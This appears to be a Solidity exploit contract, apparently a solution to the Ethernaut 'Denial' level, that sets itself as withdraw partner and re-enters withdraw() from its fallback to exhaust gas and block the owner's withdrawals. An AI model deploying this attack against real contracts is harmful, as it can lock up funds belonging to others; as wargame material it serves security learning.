// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Denial.sol';

contract Attacker {
    Denial target;

    constructor(address payable _target) public {
        target = Denial(_target);
        target.setWithdrawPartner(address(this));
    }

    function attack() public {
        target.withdraw();
    }

    fallback() payable external{
        attack();
    }
}